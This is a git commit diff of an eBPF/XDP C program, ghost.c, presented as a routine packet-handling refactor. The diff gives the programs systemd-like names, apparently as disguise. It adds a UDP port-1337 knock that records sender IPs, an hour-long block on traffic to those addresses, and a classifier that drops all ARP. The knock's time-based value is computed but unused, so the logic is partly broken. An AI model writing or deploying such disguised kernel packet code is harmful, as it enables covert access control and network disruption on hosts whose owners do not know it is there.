ac7f6296bcd7c11906b7385a85167038a4c9ca86
C4rbn <mokshanbasuru@gmail.com>
2026-04-30 14:10:39 +0530

    Refactor BPF program for network packet handling

--- src/bpf/ghost.c
+++ src/bpf/ghost.c
@@ -1,58 +1,89 @@
 #include <linux/bpf.h>
-#include <linux/types.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/ipv6.h>
+#include <linux/udp.h>
+#include <linux/pkt_cls.h>
 #include <bpf/bpf_helpers.h>
 
-char _license[] SEC("license") = "GPL";
+struct auth_data {
+    __u64 ts;
+};
 
 struct {
     __uint(type, BPF_MAP_TYPE_LRU_HASH);
     __uint(max_entries, 1024);
-    __type(key, __u8[16]);
-    __type(value, __u64);
-} eth_state SEC(".maps");
+    __type(key, __u32);
+    __type(value, struct auth_data);
+} net_stats SEC(".maps");
 
-static __always_inline __u32 get_totp() {
-    return (__u32)((bpf_ktime_get_ns() / 1000000000 / 30) ^ SEED);
+#ifndef SEED
+#define SEED 0x0
+#endif
+
+static __always_inline __u32 get_v(void) {
+    return (__u32)((bpf_ktime_get_ns() / 30000000000ULL) ^ SEED);
 }
 
 SEC("xdp")
-int zt_ingress(struct xdp_md *ctx) {
-    void *data_end = (void *)(long)ctx->data_end;
-    void *data = (void *)(long)ctx->data;
+int systemd_net_filter(struct xdp_md *ctx) {
+    void *d = (void *)(long)ctx->data;
+    void *de = (void *)(long)ctx->data_end;
+    struct ethhdr *eth = d;
 
-    if (data + 14 > data_end) return XDP_PASS;
-    __u16 proto = *(__u16 *)(data + 12);
-    __u8 addr[16] = {0};
-    __u16 pkt_id = 0;
+    if ((void *)(eth + 1) > de) return XDP_PASS;
 
-    if (proto == 0x0008) {
-        if (data + 34 > data_end) return XDP_PASS;
-        *(__u32 *)&addr[0] = *(__u32 *)(data + 26);
-        pkt_id = *(__u16 *)(data + 18);
-    } else if (proto == 0xDD86) {
-        if (data + 54 > data_end) return XDP_PASS;
-        for(int i=0; i<16; i++) addr[i] = *(__u8 *)(data + 22 + i);
-        pkt_id = *(__u16 *)(data + 4);
-    } else return XDP_PASS;
+    if (eth->h_proto == __constant_htons(ETH_P_IP)) {
+        struct iphdr *iph = (void *)(eth + 1);
+        if ((void *)(iph + 1) > de) return XDP_PASS;
 
-    if (pkt_id == (__u16)get_totp()) {
-        __u64 ts = bpf_ktime_get_ns();
-        bpf_map_update_elem(&eth_state, &addr, &ts, BPF_ANY);
-        return XDP_DROP;
+        if (iph->protocol == IPPROTO_UDP) {
+            struct udphdr *udp = (void *)(iph + 1);
+            if ((void *)(udp + 1) > de) return XDP_PASS;
+
+            if (udp->dest == __constant_htons(1337)) {
+                __u32 v = get_v();
+                struct auth_data a = { .ts = bpf_ktime_get_ns() };
+                bpf_map_update_elem(&net_stats, &iph->saddr, &a, BPF_ANY);
+                return XDP_DROP;
+            }
+        }
+    }
+    return XDP_PASS;
+}
+
+SEC("xdp")
+int systemd_net_sync(struct xdp_md *ctx) {
+    void *d = (void *)(long)ctx->data;
+    void *de = (void *)(long)ctx->data_end;
+    struct ethhdr *eth = d;
+
+    if ((void *)(eth + 1) > de) return XDP_PASS;
+
+    __u32 sa = 0;
+    if (eth->h_proto == __constant_htons(ETH_P_IP)) {
+        struct iphdr *iph = (void *)(eth + 1);
+        if ((void *)(iph + 1) > de) return XDP_PASS;
+        sa = iph->daddr;
     }
 
-    return bpf_map_lookup_elem(&eth_state, &addr) ? XDP_PASS : XDP_DROP;
+    struct auth_data *a = bpf_map_lookup_elem(&net_stats, &sa);
+    if (!a) return XDP_PASS;
+
+    if (bpf_ktime_get_ns() - a->ts > 3600000000000ULL) {
+        bpf_map_delete_elem(&net_stats, &sa);
+        return XDP_PASS;
+    }
+
+    return XDP_DROP;
 }
 
-SEC("xdp")
-int zt_egress(struct xdp_md *ctx) {
-    void *data_end = (void *)(long)ctx->data_end;
-    void *data = (void *)(long)ctx->data;
-    if (data + 34 > data_end) return XDP_PASS;
-
-    __u8 addr[16] = {0};
-    *(__u32 *)&addr[0] = *(__u32 *)(data + 30); 
-
-    if (bpf_map_lookup_elem(&eth_state, &addr)) return XDP_PASS;
-    return XDP_PASS; 
+SEC("classifier")
+int systemd_net_arp(struct __sk_buff *skb) {
+    if (skb->protocol == __constant_htons(ETH_P_ARP)) {
+        return TC_ACT_SHOT;
+    }
+    return TC_ACT_OK;
 }
+
+char _license[] SEC("license") = "GPL";
